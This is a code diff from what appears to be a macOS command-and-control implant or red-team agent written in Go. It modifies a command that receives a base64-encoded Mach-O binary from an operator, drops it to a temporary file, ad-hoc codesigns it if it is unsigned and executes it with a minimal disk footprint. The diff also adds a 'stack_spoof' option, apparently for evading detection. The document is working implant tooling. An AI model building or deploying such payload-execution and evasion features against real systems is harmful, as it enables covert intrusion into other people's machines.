@@ -6,7 +6,6 @@ import (
 	"bytes"
 	"context"
 	"encoding/base64"
-	"encoding/json"
 	"fmt"
 	"os"
 	"os/exec"
@@ -22,6 +21,7 @@ type executeMemoryArgs struct {
 	Arguments  string `json:"arguments"`   // command-line arguments (space-separated)
 	Timeout    int    `json:"timeout"`     // execution timeout in seconds (default: 60)
 	ExportName string `json:"export_name"` // (Windows only) export function to call for DLLs
+	StackSpoof bool   `json:"stack_spoof"`
 }
 
 // ExecuteMemoryCommand executes a Mach-O binary with minimal disk footprint.
@@ -38,9 +38,9 @@ func (c *ExecuteMemoryCommand) Execute(task structs.Task) structs.CommandResult 
 		return errorResult("Error: binary_b64 parameter required (base64-encoded Mach-O binary)")
 	}
 
-	var args executeMemoryArgs
-	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
-		return errorf("Error parsing parameters: %v", err)
+	args, parseErr := unmarshalParams[executeMemoryArgs](task)
+	if parseErr != nil {
+		return *parseErr
 	}
 
 	if args.BinaryB64 == "" {
@@ -86,11 +86,13 @@ func (c *ExecuteMemoryCommand) Execute(task structs.Task) structs.CommandResult 
 		return errorf("Error setting executable permission: %v", err)
 	}
 
-	// Ad-hoc codesign — required on Apple Silicon (arm64) for unsigned binaries.
-	// Without signing, macOS kills the process immediately with SIGKILL.
-	if signOut, signErr := execCmdTimeout("/usr/bin/codesign", "-s", "-", tmpPath); signErr != nil {
-		secureRemove(tmpPath)
-		return errorf("Error code signing binary: %v: %s", signErr, string(signOut))
+	// Ad-hoc codesign only if the binary is unsigned. Pre-signed binaries (e.g., system
+	// utilities) must keep their original signature or macOS SIGKILL's them.
+	if _, verifyErr := execCmdTimeout("/usr/bin/codesign", "-v", "--no-strict", tmpPath); verifyErr != nil {
+		if signOut, signErr := execCmdTimeout("/usr/bin/codesign", "-s", "-", tmpPath); signErr != nil {
+			secureRemove(tmpPath)
+			return errorf("Error code signing binary: %v: %s", signErr, string(signOut))
+		}
 	}
 
 	// Parse command-line arguments
